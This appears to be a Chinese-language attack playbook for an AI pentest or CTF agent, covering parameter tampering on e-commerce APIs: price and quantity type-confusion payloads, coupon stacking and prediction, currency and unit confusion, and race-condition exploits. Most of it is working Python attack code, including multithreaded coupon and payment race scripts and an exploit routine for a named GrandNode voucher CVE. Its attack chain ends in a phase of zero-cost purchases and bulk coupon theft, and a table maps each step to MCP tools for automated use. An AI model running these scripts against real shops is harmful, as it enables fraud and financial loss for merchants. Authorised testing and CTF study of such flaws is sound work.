# 参数篡改全链 — 价格/数量/优惠券/竞态深度攻击

## 场景

参数篡改（Parameter Tampering）是最古老但最高产的漏洞类别之一。攻击者修改客户端与服务器之间传输的参数值来实现不正当利益：零元购、负金额充值、库存操爆、优惠券无限使用。核心问题是服务端信任了客户端传来的业务参数而未做服务端校验。

## 输入信号

- 价格/数量/折扣在请求体或 URL 参数中明文传输
- 响应中包含 `amount`、`total`、`quantity`、`discount` 等字段且与请求一致
- 优惠券/折扣码可重复提交或叠加使用
- 多步骤流程中金额在步骤间传递（`step1` 传 `amount` 到 `step2`）
- 货币符号或单位在请求中出现（`currency: USD`、`unit: cent`）
- 支付成功回调中包含金额参数（服务端未从内部订单系统读取）
- 库存系统存在整数/浮点类型边界

## 核心方法论

### 1. 价格操纵深度矩阵

#### 1.1 类型混淆全向量

```python
# price_tamper.py — 价格篡改全类型向量

PRICE_TAMPER_VECTORS = {
    # === 零值 ===
    "zero_int": 0,
    "zero_float": 0.0,
    "zero_str": "0",
    "zero_comma": "0.00",

    # === 负值 ===
    "neg_int": -1,
    "neg_float": -100.50,
    "neg_str": "-100",

    # === 极小值 (精度舍入到 0) ===
    "sub_cent": 0.001,          # < 1 分
    "sub_001": 0.0001,
    "sub_000001": 0.000001,
    "micro": 1e-8,
    "nano": 1e-9,

    # === 浮点精度 ===
    "float_issue_1": 100.00000000000001,   # IEEE 754 → == 100.0
    "float_issue_2": 0.1 + 0.2,             # → 0.30000000000000004
    "float_issue_3": 1.0 / 3.0,             # → 0.3333333333333333
    "float_issue_4": 9007199254740992,       # JS MAX_SAFE_INTEGER + 1

    # === 科学计数法 ===
    "sci_neg": "-1e9",
    "sci_tiny": "1e-9",
    "sci_zero": "0e0",
    "sci_big": "1e99",

    # === NaN / Infinity ===
    "nan": "NaN",
    "inf": "Infinity",
    "neg_inf": "-Infinity",
    "inf_div": "1e999",

    # === 空/未定义 ===
    "null": None,
    "empty_str": "",
    "bool_false": False,
    "bool_true": True,
    "empty_array": [],

    # === 语言特殊 ===
    "php_suffix": "100abc",       # PHP: (int)"100abc" → 100
    "php_octal": "0100",          # PHP 8 之前: 八进制
    "php_hex": "0x64",           # PHP: intval("0x64") → 100
    "js_octal_es5": "0100",      # ES5 严格前: 八进制
    "py_underscore": "100_000",  # Python 字面量 (int("100_000") → 100000)
    "fullwidth": "１００",      # 全角数字 → 可能被 ICU 转换
    "euro_comma": "100,00",      # 欧洲格式: 100,00 = 100.00
}

def comprehensive_price_test(base_url, session, order_data: dict):
    """全类型价格篡改测试"""
    price_fields = ["amount", "price", "total", "unit_price", "subtotal"]
    results = {}

    for field in price_fields:
        for vector_name, vector_value in PRICE_TAMPER_VECTORS.items():
            payload = {**order_data, field: vector_value}
            try:
                r = session.post(f"{base_url}/api/order/create",
                                 json=payload, timeout=10)
                resp_text = r.text[:250]
            except:
                resp_text = "REQUEST_FAILED"

            # 检测成功: 201/200 + order_id 出现
            success = r.status_code in (200, 201) and "order_id" in resp_text
            if success:
                results[f"{field}.{vector_name}"] = {
                    "status": r.status_code,
                    "body": resp_text,
                    "value": str(vector_value)[:50],
                }

        # 批量输出
        bypasses = [k for k in results if k.startswith(f"{field}.")]
        if bypasses:
            print(f"\n[!] {field}: {len(bypasses)} bypass vectors found")
            for b in bypasses[:5]:
                print(f"    {b}: {results[b]['value']} → {results[b]['status']}")

    return results
```

#### 1.2 数量/库存操爆

```python
# quantity_exploit.py — 数量/库存操爆

QUANTITY_EXPLOIT_VECTORS = {
    # === 负数 (可能变退款/充值) ===
    "neg_one": -1,
    "neg_max": -2147483648,

    # === 零 (释放库存但不下单?) ===
    "zero": 0,

    # === 小数 (checkout 只取整? 1.5 → 1 不触发限购) ===
    "half": 0.5,
    "near_one": 0.999,

    # === 超大 (溢出/绕过库存检查) ===
    "int_max_32": 2147483647,
    "int_max_64": 9223372036854775807,
    "overflow_neg": 2147483648,       # 32-bit signed overflow → -2147483648
    "big_big": 999999999999999999999999,

    # === 字符串 (PHP 类型转换) ===
    "str_many": "many",
    "str_all": "all",
    "str_unlimited": "unlimited",
    "str_neg": "-1",

    # === 数组 (PHP: count([int]) == 1) ===
    "arr_one": [1],
    "arr_empty": [],

    # === 按价格自动分配 ===
    "price_per_item": {"quantity": "auto", "max_price": 0.01},
}

def quantity_exploit_test(base_url, session, product_id=1, unit_price=100):
    """测试数量相关参数篡改"""
    results = {}
    for vector_name, vector_value in QUANTITY_EXPLOIT_VECTORS.items():
        payload = {"product_id": product_id, "quantity": vector_value}
        r = session.post(f"{base_url}/api/order/create",
                         json=payload, timeout=10)
        try:
            resp = r.json()
            total = resp.get("total", resp.get("amount", resp.get("data", {}).get("total")))
            results[vector_name] = {
                "status": r.status_code,
                "total": total,
                "body_preview": r.text[:200],
            }
        except:
            results[vector_name] = {"status": r.status_code, "total": None}

        # 检测异常: 负数总价 / 总价小于单价 / 0 元
        if r.status_code in (200, 201):
            if total is not None and total <= 0:
                print(f"[!] {vector_name}: total={total} (<= 0)")
            elif total is not None and total < unit_price:
                print(f"[?] {vector_name}: total={total} < unit_price={unit_price}")

    return results
```

### 2. 优惠券/折扣深度利用

#### 2.1 优惠券生命周期攻击 (完整版)

```python
# coupon_lifecycle.py — 优惠券全生命周期攻击

class CouponLifecycleAttack:
    """优惠券创建→绑定→使用→退还全链路攻击"""

    def __init__(self, base_url, session):
        self.base = base_url
        self.s = session
        self.state = {}

    def attack_all_phases(self):
        """执行全链路攻击"""
        results = {}

        # === Phase 1: 创建/获取 ===
        results["batch_steal"] = self._batch_steal()
        results["predict_code"] = self._predict_coupon_code()
        results["expired_redeem"] = self._redeem_expired()

        # === Phase 2: 绑定 ===
        results["rebind"] = self._rebind_to_other()
        results["mass_redeem"] = self._race_redeem()

        # === Phase 3: 使用 ===
        results["stack_discounts"] = self._stack_discounts()
        results["overflow_discount"] = self._overflow_discount()
        results["wrong_product"] = self._use_on_wrong_product()

        # === Phase 4: 退还 ===
        results["cancel_return_coupon"] = self._cancel_return_coupon()
        results["double_return"] = self._double_return()
        results["partial_keep"] = self._partial_refund_keep()

        return results

    def _batch_steal(self):
        """批量领取限领优惠券"""
        findings = []
        # 找批量领取接口
        endpoints = [
            ("POST", "/api/coupon/batch-claim", {"batch_id": "BATCH001"}),
            ("POST", "/api/coupon/grab", {"activity_id": "ACT001"}),
            ("GET", "/api/coupon/claim-all"),
        ]
        for method, path, data in endpoints:
            r = self.s.request(method, f"{self.base}{path}", json=data)
            if r.status_code == 200 and "coupon" in r.text.lower():
                findings.append({"type": "batch_steal", "status": 200, "body": r.text[:200]})
        return findings

    def _predict_coupon_code(self):
        """预测优惠券码"""
        # 常见模式: 固定前缀 + 日期 + 序号
        patterns = [
            "NEWUSER{seq:06d}",      # NEWUSER000001
            "VIP{date:%Y%m%d}{seq:04d}",
            "WELCOME{seq}",
            "SAVE{rand:04d}",
        ]
        # 收集已有的优惠券码
        sample = self._get_sample_codes()
        # 根据样本推断模式
        return {"sample_codes": sample}

    def _stack_discounts(self):
        """折扣叠加测试"""
        stacking_payloads = [
            # 百分比 + 百分比: 50% + 50% → 75%? 还是 100%?
            {"coupons": ["PCT50", "PCT50"]},
            # 百分比 + 固定金额: 50% + $30 → 1 元?
            {"coupons": ["PCT90", "FIX30"]},
            # 两次固定金额
            {"coupons": ["FIX50", "FIX50"]},
            # 平台券 + 店铺券
            {"coupons": ["PLATFORM50", "STORE50"]},
            # 满减: 不满足条件时使用
            {"coupons": ["OVER100_MINUS50"], "amount": 30},
            # 优惠金额 > 商品金额
            {"coupons": ["BIG100"], "amount": 50},
        ]
        results = []
        for payload in stacking_payloads:
            r = self.s.post(f"{self.base}/api/order/apply-coupons",
                           json=payload, timeout=10)
            results.append({
                "payload": payload,
                "status": r.status_code,
                "body": r.text[:200],
            })
        return results

    def _use_on_wrong_product(self):
        """全场券用限定商品之外"""
        r = self.s.post(f"{self.base}/api/order/apply-coupon", json={
            "coupon_code": "SPECIFIC_PRODUCT_COUPON",
            "product_id": 999,  # 不在限定范围
        })
        return {"status": r.status_code, "body": r.text[:200]}
```

#### 2.2 优惠券竞态条件 (Race Condition)

```python
# coupon_race_advanced.py — 高级优惠券竞态

import concurrent.futures, threading, time, requests

class CouponRaceAttack:
    """优惠券竞态攻击 - 单券多领、双券同用"""

    def __init__(self, base_url, token):
        self.base = base_url
        self.headers = {"Authorization": f"Bearer {token}"}

    def single_coupon_multi_use(self, coupon_code: str, n_requests: int = 50,
                                 concurrency: int = 20):
        """
        单张优惠券多用户同时领取
        真实案例: GrandNode CVE-2025-10216
        """
        successes = []
        errors = []
        lock = threading.Lock()

        def redeem(user_id: int):
            s = requests.Session()
            s.headers.update(self.headers)
            try:
                r = s.post(f"{self.base}/api/coupon/redeem", json={
                    "code": coupon_code,
                    "user_id": f"race_user_{user_id}",
                }, timeout=15)
                with lock:
                    if r.status_code == 200:
                        successes.append(user_id)
                    elif r.status_code != 429:  # 不是 rate limit
                        errors.append((user_id, r.status_code, r.text[:100]))
            except Exception as e:
                with lock:
                    errors.append((user_id, 0, str(e)))

        with concurrent.futures.ThreadPoolExecutor(max_workers=concurrency) as ex:
            futs = [ex.submit(redeem, i) for i in range(n_requests)]
            concurrent.futures.wait(futs)

        return {
            "coupon": coupon_code,
            "success_count": len(successes),
            "expected_max": 1,
            "race_found": len(successes) > 1,
            "error_count": len(errors),
        }

    def race_create_use(self, coupon_code: str):
        """并发: 创建订单 + 使用优惠券"""
        def create_order():
            s = requests.Session()
            s.headers.update(self.headers)
            r = s.post(f"{self.base}/api/order/create", json={
                "product_id": 1, "quantity": 1, "coupon": coupon_code
            })
            return r.json() if r.status_code == 200 else None

        def redeem_coupon():
            s = requests.Session()
            s.headers.update(self.headers)
            r = s.post(f"{self.base}/api/coupon/redeem", json={
                "code": coupon_code,
                "user_id": "race_user",
            })
            return r.status_code

        with concurrent.futures.ThreadPoolExecutor(max_workers=2) as ex:
            fut1 = ex.submit(create_order)
            fut2 = ex.submit(redeem_coupon)
            result1 = fut1.result()
            result2 = fut2.result()

        return {
            "create_order": result1,
            "redeem_coupon": result2,
            "double_use": result1 is not None and result2 == 200
        }

    def cancel_redeem_race(self, coupon_code: str):
        """取消订单 + 再领取优惠券的竞态"""
        # 1. 领取优惠券
        r = requests.post(f"{self.base}/api/coupon/redeem",
                         json={"code": coupon_code, "user_id": "test_user"})

        # 2. 使用优惠券下单
        r = requests.post(f"{self.base}/api/order/create",
                         json={"product_id": 1, "coupon": coupon_code})

        # 3. 并发: 取消订单 + 再次使用同一个优惠券
        order_id = r.json().get("order_id")

        def cancel():
            s = requests.Session()
            s.headers.update(self.headers)
            return s.post(f"{self.base}/api/order/{order_id}/cancel")

        def reuse():
            s = requests.Session()
            s.headers.update(self.headers)
            return s.post(f"{self.base}/api/order/create",
                         json={"product_id": 2, "coupon": coupon_code})

        with concurrent.futures.ThreadPoolExecutor(max_workers=2) as ex:
            fut_cancel = ex.submit(cancel)
            fut_reuse = ex.submit(reuse)
            cancel_result = fut_cancel.result()
            reuse_result = fut_reuse.result()

        return {
            "cancel_status": cancel_result.status_code,
            "reuse_status": reuse_result.status_code,
            "reuse_body": reuse_result.text[:200],
        }
```

### 3. 货币/汇率混淆攻击

```python
# currency_confusion.py — 货币混淆攻击

CURRENCY_CONFUSION_PAYLOADS = {
    # === 货币切换 ===
    "currency_swap": [
        {"currency": "CNY", "amount": 1},
        {"currency": "USD", "amount": 1},   # 1 USD ≈ 7 CNY
        {"currency": "JPY", "amount": 1},   # 1 JPY ≈ 0.05 CNY
        {"currency": "KRW", "amount": 1},   # 1 KRW ≈ 0.005 CNY
        {"currency": "VND", "amount": 1},   # 1 VND ≈ 0.0003 CNY
        {"currency": "IRR", "amount": 1},   # 1 IRR ≈ 0.000024 CNY
        {"currency": "TWD", "amount": 1},
        {"currency": "HKD", "amount": 1},
    ],

    # === 精度混淆 ===
    "precision_swap": [
        {"currency": "JPY", "amount": 100},  # JPY 通常无小数
        {"currency": "KWD", "amount": 1.000},  # KWD 3 位小数
        {"currency": "BHD", "amount": 1.000},  # BHD 3 位小数
        {"currency": "OMR", "amount": 1.000},  # OMR 3 位小数
    ],

    # === 单位混淆 ===
    "unit_confusion": [
        {"amount": 1, "unit": "cent"},
        {"amount": 1, "unit": "fen"},
        {"amount": 1, "unit": "yuan"},
        {"amount": 1, "unit": "dollar"},
        {"amount": 1, "unit": "point"},
    ],

    # === 双重货币 ===
    "dual_currency": [
        {"display_currency": "USD", "settlement_currency": "VND",
         "amount": 100, "settlement_amount": 100},
        # 展示 100 USD, 结算 100 VND
    ],
}

def test_currency_bypass(base_url, session, base_product_price=100):
    """测试货币混淆绕过"""
    results = []

    # 测试切换货币
    for entry in CURRENCY_CONFUSION_PAYLOADS["currency_swap"]:
        r = session.post(f"{base_url}/api/order/create",
                        json={"product_id": 1, **entry}, timeout=10)
        try:
            resp = r.json()
            final_amount = resp.get("amount", resp.get("total", {}).get("amount"))
        except:
            final_amount = None

        # 预期支付远低于 100 CNY 的货币
        cheap_currencies = ["VND", "IRR", "JPY", "KRW"]
        if entry["currency"] in cheap_currencies and r.status_code in (200, 201):
            if final_amount and float(final_amount) < 1:
                print(f"[!] Currency bypass: {entry['currency']} "
                      f"amount={entry['amount']} → final={final_amount}")
                results.append(entry)

        # 测试单位混淆
        for unit_entry in CURRENCY_CONFUSION_PAYLOADS["unit_confusion"]:
            r = session.post(f"{base_url}/api/order/create",
                            json={"product_id": 1, **unit_entry}, timeout=10)
            if r.status_code in (200, 201):
                try:
                    data = r.json()
                    total = data.get("total", data.get("amount"))
                    if total and float(total) < base_product_price * 0.1:
                        print(f"[!] Unit bypass: {unit_entry} → total={total}")
                        results.append(unit_entry)
                except:
                    pass

    return results
```

### 4. 竞态条件攻击 (Race Condition)

#### 4.1 TOCTOU 完整利用

```python
# toctou_exploit.py — 时间戳检查竞态利用

import concurrent.futures, threading, time, requests

class TOCTOUExploit:
    """
    Time-of-Check Time-of-Use 竞态利用
    典型场景:
    - 优惠券限领 1 次 (先检查 count, 再 insert)
    - 账户余额扣减 (先检查 balance >= amount, 再扣减)
    - 库存超卖 (先检查 stock > 0, 再 decrement)
    - 投票/点赞 (先检查是否已投, 再 insert)
    """

    def __init__(self, base_url, session):
        self.base = base_url
        self.s = session

    def turbo_intruder_style(self, endpoint: str, payload_generator, n_threads=30):
        """
        Burp Turbo Intruder 风格竞态测试
        一次发送 n_threads 个并行请求
        """
        results = []
        errors = []
        lock = threading.Lock()
        barrier = threading.Barrier(n_threads)  # 同步屏障: 所有线程同时发送

        def worker(thread_id: int):
            payload = payload_generator(thread_id)
            s = requests.Session()
            # 在屏障处等待所有线程就绪
            try:
                barrier.wait(timeout=5)
            except:
                pass
            try:
                r = s.post(f"{self.base}{endpoint}", json=payload, timeout=15)
                with lock:
                    results.append({"thread": thread_id, "status": r.status_code, "body": r.text[:200]})
            except Exception as e:
                with lock:
                    errors.append({"thread": thread_id, "error": str(e)})

        with concurrent.futures.ThreadPoolExecutor(max_workers=n_threads) as ex:
            futs = [ex.submit(worker, i) for i in range(n_threads)]
            concurrent.futures.wait(futs)

        return {"results": results, "errors": errors}

    def payment_race(self, order_id: str):
        """支付竞态: 同时发起多笔支付"""
        def make_payment(payment_id: int):
            s = requests.Session()
            s.headers.update({"Authorization": "Bearer FAKE_TOKEN"})
            return s.post(f"{self.base}/api/payment/confirm", json={
                "order_id": order_id,
                "transaction_id": f"TXN_RACE_{payment_id}",
                "amount": 0.01,
            })

        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
            futs = [ex.submit(make_payment, i) for i in range(10)]
            responses = [f.result() for f in concurrent.futures.as_completed(futs)]

        payment_successes = [r for r in responses if r.status_code == 200]
        print(f"[!] Payment race: {len(payment_successes)}/10 success (expected: 1)")
        return payment_successes
```

#### 4.2 GrandNode CVE-2025-10216

```python
# grandnode_cve_2025_10216.py — 优惠券竞态利用

def grandnode_voucher_race_exploit(base_url, session):
    """
    CVE-2025-10216: GrandNode 4.10 优惠券竞态
    原理: voucher usage check 和 increment 不是原子操作
    并发请求可多次使用同一张优惠券
    """
    attacker = TOCTOUExploit(base_url, session)

    # Step 1: 获取/生成一个优惠券
    r = session.post(f"{base_url}/api/voucher/create", json={
        "code": "RACE_TEST_001",
        "discount": 100,
        "max_uses": 1,
    })

    # Step 2: 并发使用
    def payload_fn(i):
        return {
            "cart_id": f"CART_RACE_{i}",
            "voucher_code": "RACE_TEST_001",
            "product_id": "premium_item",
        }

    result = attacker.turbo_intruder_style("/api/checkout/apply-voucher",
                                            payload_fn, n_threads=20)

    successes = [r for r in result["results"] if r["status"] == 200]
    print(f"[CVE-2025-10216] Voucher race: {len(successes)} successes (expected: 1)")

    # Step 3: 如果多次成功 → 批量下单使用优惠券
    if len(successes) > 1:
        for i, s in enumerate(successes[:5]):
            r2 = session.post(f"{base_url}/api/order/create", json={
                "product_id": "premium_item",
                "voucher": "RACE_TEST_001",
            })
            print(f"  Order {i}: status={r2.status_code}")
```

### 5. 真实 CVE 分析

| CVE | 产品 | 类型 | 原理 |
|-----|------|------|------|
| CVE-2025-10216 | GrandNode 4.10 | 优惠券竞态 | 优惠券使用检查和扣减非原子操作，并发请求重复使用 |
| CVE-2025-3889 | WordPress Simple Shopping Cart | extract() 覆盖 | `extract($_POST)` 覆盖 `$wpdb` 变量导致注入 |
| CVE-2024-31456 | Ghost CMS | 价格篡改 | Stripe 金额在客户端计算，修改 `amount` 参数导致低价订阅 |
| CVE-2024-29201 | JumpCloud SAML | SAML 参数篡改 | SAML Response 中 `email` 参数可篡改，任意用户登录 |
| CVE-2024-27198 | JetBrains TeamCity (CVSS 9.8) | 认证绕过 | `login` 端点 URI 路径检查不完善，添加 `/mvn` 路径段绕过鉴权 |

## 攻击链

```
Phase 1 — 参数面发现
  ├── 注册/创建订单请求 → 观察所有可操控参数
  ├── 价格/数量/优惠券/运费/税费
  ├── 支付回调/通知接口
  └── API 文档查看类型定义

Phase 2 — 类型混淆测试
  ├── 负值/零值/NaN/Infinity 价格
  ├── 负数/超大/小数数量
  ├── 货币/单位切换
  └── 科学计数法/字面量注入

Phase 3 — 优惠券链路
  ├── 预测/暴力枚举优惠券码
  ├── 折扣叠加 (百分比+固定/平台+商家)
  ├── 优惠金额 > 商品金额
  └── 竞态: 多线程同券多领

Phase 4 — 竞态条件
  ├── TOCTOU: 支付/扣款/核销
  ├── 优惠券: 核销→退还→再核销
  └── 库存: 超卖→超发

Phase 5 — 固定
  ├── 批量领取所有优惠券
  ├── 零元购/负金额充值
  └── 无限库存利用
```

## MCP 工具映射

AI Agent 可调用以下 MCP 工具自动检测上述漏洞：

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| HTTP 探测参数变化 | `http_probe` | 修改价格/数量等参数后发送请求 |
| 按信号查知识库 | `kb_router` | 搜索 parameter tampering / race condition 相关技术文件 |
| 阅读技术细节 | `kb_read_file` | 读取本文档获取完整攻击链 |
| 运行竞态测试 | `run_ctf_tool` | Burp Turbo Intruder 风格竞态脚本 |

## 参考资料

- [CVE-2025-10216] GrandNode 4.10 — Voucher Race Condition (CVSS 7.5)
- [CVE-2025-3889] WordPress Simple Shopping Cart — extract() Variable Overwrite
- [CWE-20] Improper Input Validation
- [CWE-362] Concurrent Execution using Shared Resource with Improper Synchronization (Race Condition)
- [CWE-784] Reliance on Cookies / Parameters in a Security Decision
- PortSwigger Research: "Turbo Intruder — Exploiting Race Conditions"
- OWASP: Testing for Insecure Direct Object References (WSTG-ATHZ-04)

## 证据与验证闭环

- 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
- 将“响应差异”与服务端副作用分开记录；只有权限、状态、数据或 Flag 可重复变化才算确认。
- 从全新 session/重置状态最小化重放，记录依赖、并发参数、时间窗口及失败样本。
- 输出统一放入 `exports/ctf-website/<case>/`，凭据只用 `REDACTED` 占位，自动检索 `flag{}`、`CTF{}`、`DASCTF{}`。
